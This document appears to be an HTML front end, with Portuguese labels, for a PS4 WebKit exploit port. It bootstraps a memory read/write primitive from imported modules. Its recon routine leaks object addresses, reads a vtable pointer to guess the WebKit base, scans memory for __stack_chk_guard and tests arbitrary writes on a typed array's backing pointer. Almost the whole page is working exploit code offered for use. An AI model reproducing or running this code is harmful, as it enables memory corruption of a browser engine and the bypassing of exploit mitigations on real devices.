<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PS4 WebKit RW Primitive</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    background: #0b0f19;
    color: #c8ced8;
    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    gap: 14px;
    padding: 20px;
  }
  h1 { color: #fff; font-size: 22px; letter-spacing: 0.5px; }
  #status {
    font-size: 20px; font-weight: 700; color: #fff;
    min-height: 1.5em;
    text-align: center;
  }
  #log {
    width: 95%; max-width: 900px; height: 520px;
    background: #111827; border: 1px solid #1f2937;
    border-radius: 10px; padding: 14px 16px;
    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
    font-size: 12px; color: #9fb1c3;
    white-space: pre-wrap; word-break: break-all;
    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
  }
  #log .ok { color: #4ade80; }
  #log .err { color: #f87171; }
  #log .info { color: #60a5fa; }
  #log .warn { color: #fbbf24; }
  #actions {
    display: flex; gap: 12px; flex-wrap: wrap;
    justify-content: center;
  }
  button {
    padding: 12px 28px; border: 1px solid rgba(255,255,255,0.18);
    border-radius: 12px; color: #fff;
    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
    box-shadow: 0 8px 24px rgba(37,99,235,0.28);
    font: 700 15px/1 "Segoe UI", system-ui, sans-serif;
    cursor: pointer; transition: all .12s ease;
  }
  button:hover { transform: translateY(-2px); }
  button:active { transform: translateY(1px); }
  button:disabled {
    opacity: 0.45; cursor: not-allowed; transform: none;
    background: #374151; box-shadow: none;
  }
</style>
</head>
<body>

<h1>PS4 WebKit Exploit — Slopkit Port</h1>
<div id="status">Inicializando...</div>
<div id="log"></div>
<div id="actions">
  <button id="btnRecon" disabled>Executar Recon</button>
  <button id="btnClear" onclick="clearLog()">Limpar Log</button>
</div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const status = document.getElementById("status");
  const logBox = document.getElementById("log");
  const btnRecon = document.getElementById("btnRecon");

  function log(msg, cls = "info") {
    const line = document.createElement("div");
    line.className = cls;
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
  }

  window.clearLog = function() {
    logBox.innerHTML = "";
  };

  function onCoreEvent(tag, detail) {
    log(`${tag}: ${detail}`, "info");
  }

  function onMemEvent(tag, detail) {
    log(`${tag}: ${detail}`, "info");
  }

  // ========== RECONHECIMENTO PS4 ==========
  window.reconPS4 = async function() {
    const p = window.p;
    if (!p) {
      log("window.p não está disponível!", "err");
      return;
    }
    log("=== INICIANDO RECON PS4 ===", "ok");

    try {
      // 1. Leak textarea
      let textarea = document.createElement("textarea");
      let textAddr = p.leakval(textarea);
      log(`textarea object @ 0x${textAddr.toString(16)}`, "info");

      // 2. Vtable pointer (offset +0x18 no PS4 WebKit)
      let vtablePtr = p.read8(textAddr.add32(0x18));
      log(`vtable ptr @ 0x${vtablePtr.toString(16)}`, "info");

      // 3. Primeiro entry do vtable
      let firstEntry = p.read8(vtablePtr);
      log(`first vtable entry @ 0x${firstEntry.toString(16)}`, "info");
      log(`  (low=0x${firstEntry.low.toString(16)}, hi=0x${firstEntry.hi.toString(16)})`, "info");

      // 4. Alinhar para baixo em 0x1000 para guess da base
      let pageOffset = firstEntry.low & 0xFFF;
      let webkitBaseGuess = firstEntry.sub32(pageOffset);
      log(`WebKit base (guess, 0x1000 aligned) ~ 0x${webkitBaseGuess.toString(16)}`, "warn");

      // 5. Sanity check: ler magic bytes
      let magic = p.read4(webkitBaseGuess);
      let magicHex = "0x" + magic.toString(16).padStart(8, '0');
      log(`Magic at guessed base: ${magicHex}`, "info");

      if (magicHex === "0x464c457f") {
        log("ELF magic detectado! Base provavelmente correta.", "ok");
      } else if (magicHex === "0xfeedfacf" || magicHex === "0xfeedface") {
        log("Mach-O magic detectado! Base provavelmente correta.", "ok");
      } else {
        log("Magic não reconhecido. Ajuste o offset do vtable manualmente.", "warn");
      }

      // 6. Tentar achar __stack_chk_guard via scan simples
      //    (procurar padrão conhecido na memória do WebKit)
      log("Iniciando scan por __stack_chk_guard...", "info");
      let foundGuard = false;
      for (let off = 0; off < 0x200000; off += 0x1000) {
        try {
          let candidate = webkitBaseGuess.add32(off);
          let val = p.read8(candidate);
          // __stack_chk_guard geralmente tem os 3 bytes superiores zerados e LSB != 0
          if (val.hi === 0 && val.low !== 0 && (val.low & 0xFF000000) !== 0) {
            log(`Possível __stack_chk_guard @ base+0x${off.toString(16)} = 0x${val.toString(16)}`, "info");
            foundGuard = true;
            break;
          }
        } catch (e) {}
      }
      if (!foundGuard) {
        log("__stack_chk_guard não encontrado no scan rápido.", "warn");
      }

      // 7. Leak de alguns objetos no heap para mapear o layout
      log("Heap sample (5 arrays):", "info");
      for (let i = 0; i < 5; i++) {
        let arr = new Uint8Array(0x100);
        let addr = p.leakval(arr);
        log(`  Array[${i}] @ 0x${addr.toString(16)}`, "info");
      }

      // 8. Testar read/write rápido
      log("Testando read/write no primitivo...", "info");
      let testBuf = new Uint8Array(8);
      let testAddr = p.leakval(testBuf);
      let original = p.read8(testAddr.add32(0x10)); // m_vector offset
      p.write8(testAddr.add32(0x10), new int64(0x41414141, 0x42424242));
      let modified = p.read8(testAddr.add32(0x10));
      p.write8(testAddr.add32(0x10), original); // restaurar
      log(`  RW test: original=0x${original.toString(16)} modified=0x${modified.toString(16)}`, "ok");

      log("=== RECON FINALIZADO ===", "ok");
      log("Próximo: informe o first vtable entry para calibrar offsets exatos.", "warn");

    } catch (e) {
      log(`ERRO no recon: ${e.name}: ${e.message}`, "err");
      console.error(e);
    }
  };

  btnRecon.onclick = window.reconPS4;

  // ========== BOOTSTRAP DO EXPLOIT ==========
  log("Carregando módulos...", "ok");
  status.textContent = "Executando exploit...";

  establishPrimitive({ onEvent: onCoreEvent })
    .then(carrier => {
      log("Core: primitivo estabelecido", "ok");
      log(`Tentativas: ${carrier.attempts}`, "info");

      const prim = installWindowP(carrier, {
        onEvent: onMemEvent,
        promote: true
      });

      log("Mem: real pair ativo", "ok");
      log("window.p está disponível", "ok");

      window.__carrier = carrier;
      window.__prim = prim;
      window.int64 = int64; // expor para uso manual no console

      status.textContent = "RW Primitivo OK — Pronto para Recon";
      status.style.color = "#4ade80";
      btnRecon.disabled = false;

      try {
        const testAddr = prim.leakval(prim);
        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
      } catch (e) {
        log(`Sanity leak falhou: ${e.message}`, "err");
      }
    })
    .catch(err => {
      log(`FALHA: ${err.name}: ${err.message}`, "err");
      status.textContent = "Falha no exploit";
      status.style.color = "#f87171";
    });
</script>

</body>
</html>
